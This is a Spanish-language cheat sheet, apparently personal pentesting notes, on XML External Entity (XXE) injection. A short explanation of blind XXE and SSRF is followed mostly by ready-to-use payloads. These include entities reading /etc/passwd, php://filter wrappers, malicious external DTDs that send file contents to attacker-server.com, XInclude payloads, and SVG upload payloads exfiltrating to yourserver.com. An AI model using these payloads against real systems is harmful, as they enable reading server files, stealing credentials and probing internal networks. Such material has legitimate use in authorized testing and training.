-- -
Cuando hablamos de XML External Entity (XXE) Injection, a lo que nos referimos es a una vulnerabilidad de seguridad en la que un atacante puede utilizar una entrada XML maliciosa para acceder a recursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios de red. Esta vulnerabilidad puede ser explotada en aplicaciones que utilizan XML para procesar entradas, como aplicaciones web o servicios web.

Un ataque XXE generalmente implica la inyección de una entidad XML maliciosa en una solicitud HTTP, que es procesada por el servidor y puede resultar en la exposición de información sensible. Por ejemplo, un atacante podría inyectar una entidad XML que hace referencia a un archivo en el sistema del servidor y obtener información confidencial de ese archivo.

Un caso común en el que los atacantes pueden explotar XXE es cuando el servidor web no valida adecuadamente la entrada de datos XML que recibe. En este caso, un atacante puede inyectar una entidad XML maliciosa que contiene referencias a archivos del sistema que el servidor tiene acceso. Esto puede permitir que el atacante obtenga información sensible del sistema, como contraseñas, nombres de usuario, claves de API, entre otros datos confidenciales.

Cabe destacar que, en ocasiones, los ataques XML External Entity (XXE) Injection no siempre resultan en la exposición directa de información sensible en la respuesta del servidor. En algunos casos, el atacante debe “ir a ciegas” para obtener información confidencial a través de técnicas adicionales.

Una forma común de “ir a ciegas” en un ataque XXE es enviar peticiones especialmente diseñadas desde el servidor para conectarse a un Document Type Definition (DTD) definido externamente. El DTD se utiliza para validar la estructura de un archivo XML y puede contener referencias a recursos externos, como archivos en el sistema del servidor.

Este enfoque de “ir a ciegas” en un ataque XXE puede ser más lento y requiere más trabajo que una explotación directa de la vulnerabilidad. Sin embargo, puede ser efectivo en casos donde el atacante tiene una idea general de los recursos disponibles en el sistema y desea obtener información específica sin ser detectado.

Adicionalmente, en algunos casos, un ataque XXE puede ser utilizado como un vector de ataque para explotar una vulnerabilidad de tipo SSRF (Server-Side Request Forgery). Esta técnica de ataque puede permitir a un atacante escanear puertos internos en una máquina que, normalmente, están protegidos por un firewall externo.

Un ataque SSRF implica enviar solicitudes HTTP desde el servidor hacia direcciones IP o puertos internos de la red de la víctima. El ataque XXE se puede utilizar para desencadenar un SSRF al inyectar una entidad XML maliciosa que contiene una referencia a una dirección IP o puerto interno en la red del servidor.

Al explotar con éxito un SSRF, el atacante puede enviar solicitudes HTTP a servicios internos que de otra manera no estarían disponibles para la red externa. Esto puede permitir al atacante obtener información sensible o incluso tomar el control de los servicios internos.
-- -
## Entidades:
Las entidades son una forma de representar un elemento de datos sin referenciar a los datos como tal, todo esto en un documento XML.

**Tipos de entidades:**
- Genéricas / Customizadas
- Externas (XXE)
- Predefinidas ---> General Entities
	- &lt (Lower Than);
	- &gt (Grater Than); 
- Entidades Parametricas ---> %nombre_entidad;
### Ejemplo de una estructura XML
```xml
<?xml version="1.0" encoding="UTF-8"?> ---> Declaración XML
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "mi entidad">]> ---> DTD (Document Type Definition)

<root>
	<name>fran</name>
	<tel>5454545as</tel>
	><email>fran@fran.com</email>
	><password>fran123</password>
</root>
```

-- -
# Normal XXE 
## Payloads: 
```xml
<!DOCTYPE foo [ <!ENTITY myFile SYSTEM "file:///etc/passwd"> ]>
<!DOCTYPE foo [ <!ENTITY myFile SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
 ```

-- - 
# XXE Out Of Band interaction (OOB) 
## Payloads
 - Estas mismas son lo mismo que las anteriores solo que a ciegas:
```xml
<!DOCTYPE foo [ <!ENTITY myFile SYSTEM "http://192.168.64.128/testXXE"> ]>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://192.168.64.128/malicious.dtd"> %xxe; ]> # ---> Lo declaro ahi mismo ya que a veces no te deja declararlo en el propio cuerpo. 
```

**Archivo malicious.dtd 1:**
- Usa el wrapper de PHP "php://filter/convert.base64-encode/resource=/etc/passwd" para leer y codificar en Base64 el archivo /etc/passwd.
- Luego, intenta exfiltrar el contenido con una entidad exfil que envía la información a attacker-server.com.
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> 
<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://attacker-server.com/?file=%file;'>">
%stack; 
%exfil;
```

**Archivo malicious.dtd 2:**
- Define una entidad %file que lee /etc/passwd.
- Usa %stack para declarar exfil, que envía el contenido a un servidor remoto.
- Finalmente, ejecuta %stack; para que se resuelva la entidad.
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % stack "<!ENTITY exfil SYSTEM 'http://attacker-server.com/?file=%file;'>">
%stack;
```

**Archivo malicious.dtd 3:**
- Igual que `malicious.dtd 2` solo que no ejecuta la entidad.
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://attacker-server.com/?file=%file;'>">
```

**Archivo malicious.dtd 4:**
- Intenta leer /etc/passwd.
- Usa error para forzar la lectura desde file://idontexist/%file;, lo que podría desencadenar un error útil para exfiltración indirecta (error-based XXE).
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % stack "<!ENTITY &#x25; error SYSTEM 'file://idontexist/%file;'>">
```
---
# Xinclude XXE 
### Testing
- Primero probamos declarar una entidad url-encodeada para ver como reacciona el servidor
```http
productId=1&storeId=1 ---> Request original
productId=%26entity%3b&storeId=1 ---> Entidad declarada y url-encodeada
```
- Si el servidor nos responde con una respuesta similar a "Entities are not allowed for security reasons" significa que esta procesando las entidades declaradas y el codigo XML.
## Payloads
**Normal Xinclude Injection**
```xml 
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>
```

**OOB**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://yourserver.serveo.net?data=file:///etc/passwd" parse="text"/></foo> 
```
---
# XXE via image File Upload
## Payloads
**Normal**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
    <!ENTITY % file SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="128px" height="128px">
    <text x="0" y="16" font-size="16">&file;</text>
</svg>

<?xml version="1.0"?>
<!DOCTYPE svg [
    <!ENTITY file SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="128px" height="128px">
    <text x="0" y="16" font-size="16">&file;</text>
</svg>
```
**OOB**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % send SYSTEM "http://yourserver.com/?data=%file;">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="128px" height="128px">
    <text x="0" y="16" font-size="16">&send;</text>
</svg>

<?xml version="1.0"?>
<!DOCTYPE svg [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % send SYSTEM "http://yourserver.com/?data=%file;">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="128px" height="128px">
    <text x="0" y="16" font-size="16">&send;</text>
</svg>
```

**Xinclude**
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include href="file:///etc/passwd" parse="text"/>
</svg>
```
-- -
## Aclaraciones:
- Siempre hay que "invocar" el nombre de la entidad dentro de la estructura XML para asi ejecutar el payload. (&myFile dentro de algun tag). 
- Siempre si no funciona probar sacar el %.

